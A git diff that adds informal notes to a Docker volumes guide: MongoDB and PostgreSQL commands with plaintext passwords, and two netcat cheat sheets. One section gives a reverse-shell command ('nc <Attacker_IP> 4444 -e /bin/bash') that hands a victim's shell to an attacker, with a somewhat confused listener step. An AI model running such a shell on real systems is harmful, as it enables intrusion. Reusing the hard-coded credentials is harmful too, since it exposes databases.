@@ -290,3 +290,119 @@ docker run --rm -v my_volume:/data -v $(pwd):/backup busybox tar xzf /backup/bac
 ## Conclusion
 Docker volumes are essential for managing persistent data in containerized applications. They offer flexibility, security, and ease of use compared to traditional file-mounting techniques. Understanding how to create, use, and manage volumes efficiently can significantly enhance Docker’s capabilities in production environments.
 
+
+connect to mongo container
+From Inside container
+mongosh --username "test_user" --password "Admin@123" --authenticationDatabase "admin"  --host "localhost" --port 27017
+mongosh --username "test_user" --password "Admin@123" --authenticationDatabase "admin"
+
+From Inside container with port mapping 5005:27017
+mongodb://test_user:Admin@123@localhost:5005/?authSource=admin
+
+psql commands :---
+create user backend_user with encrypted password 'devopsPg123';
+grant all privileges on database mydb to backend_user;
+grant all privileges on all tables in schema public to backend_user;
+grant all privileges on all sequences in schema public to backend_user;
+
+Netcat (`nc`) is a versatile networking tool used for reading from and writing to network connections. You can use it for port scanning, file transfers, simple chat servers, and more.
+
+### Basic Usage
+#### 1. Check if Netcat is Installedsh
+nc -h
+If not installed, install it using:
+- **Ubuntu/Debian**: `sudo apt install netcat`
+- **CentOS/RHEL**: `sudo yum install nc`
+- **MacOS**: `brew install netcat`
+- **Windows**: Use Ncat (comes with Nmap)
+
+#### 2. Simple TCP Server & Client
+- Start a listener on port 1234:
+sh
+  nc -l 1234
+
+- Connect to the listener from another terminal or machine:
+sh
+  nc <server-ip> 1234
+
+
+#### 3. Transfer a File
+- On the sender side:
+sh
+  cat file.txt | nc <receiver-ip> 1234
+
+- On the receiver side:
+sh
+  nc -l 1234 > received.txt
+
+
+#### 4. Port Scanningsh
+nc -zv <target-ip> 20-1000
+(`-z` = scan without sending data, `-v` = verbose mode)
+
+#### 5. Send HTTP Request Manuallysh
+echo -e "GET / HTTP/1.1\nHost: example.com\n\n" | nc example.com 80
+
+This guide provides a basic overview of Netcat usage. Modify commands as needed for your use case.
+
+**Netcat (nc) Usage Guide**
+
+Netcat (`nc`) is a powerful networking tool for reading from and writing to network connections using TCP or UDP.
+
+---
+
+### **1. Check if a Port is Open**
+nc -zv <hostname or IP> <port>
+Example:
+nc -zv google.com 443
+This checks if port 443 is open on google.com.
+
+---
+
+### **2. Simple Chat Between Two Machines**
+#### On Machine 1 (Start a listener on port 1234):
+nc -l -p 1234
+#### On Machine 2 (Connect to Machine 1):
+nc <Machine1_IP> 1234
+Now, both machines can send and receive messages.
+
+---
+
+### **3. Transfer Files Over Network**
+#### On Sender Machine:
+cat file.txt | nc <Receiver_IP> 1234
+#### On Receiver Machine:
+nc -l -p 1234 > received.txt
+
+---
+
+### **4. Create a Simple Web Server**
+echo -e "HTTP/1.1 200 OK\n\nHello, World!" | nc -l -p 8080
+Now, opening `http://localhost:8080` in a browser will display "Hello, World!".
+
+---
+
+### **5. Scan for Open Ports on a Remote Host**
+nc -z -v <hostname or IP> 20-1000
+Scans ports 20 to 1000 and lists the open ones.
+
+---
+
+### **6. Establish a Reverse Shell (for Penetration Testing)**
+#### On Attacker Machine (Listening Mode):
+nc -l -p 4444 -e /bin/bash
+#### On Victim Machine (Initiate Connection):
+nc <Attacker_IP> 4444 -e /bin/bash
+The attacker gains a shell on the victim's machine.
+
+---
+
+### **7. Send HTTP Request Using netcat**
+echo -e "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n" | nc example.com 80
+Sends an HTTP request to `example.com` and prints the response.
+
+---
+
+Netcat is a versatile tool useful for networking, troubleshooting, and penetration testing.
+
+curl -X GET "http://node-app:8080/about"
